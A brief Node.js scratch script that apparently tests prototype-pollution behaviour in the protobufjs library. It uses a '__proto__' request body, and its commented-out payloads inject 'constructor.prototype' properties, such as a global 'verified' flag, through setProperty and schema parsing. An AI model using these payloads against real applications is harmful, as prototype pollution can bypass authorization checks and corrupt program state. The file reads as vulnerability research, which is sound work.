
const protobuf = require('protobufjs');
const fs = require('fs');
var o = {}; 
// try { 
    requestBody = {title: "1", content: "1", "__proto__": {"fuck": 1}};
    schema = fs.readFileSync('./set.proto', 'utf-8');
    // console.log(schema); 
    root = protobuf.parse(schema).root;
    console.log(root);
    // console.log(root); 

    // protobuf.util.setProperty({}, "constructor.prototype.fuck", "value");
    console.log({}.fuck) ; 
    /* 
    let protoContents = fs.readFileSync('./settings.proto', 'utf-8').split('\n');
    console.log(protoContents); 

    protobuf.parse('option(a).constructor.prototype.verified = true;');
    console.log({}.verified);
    */
// } catch ( error ) { 
//     console.log(error); 
// }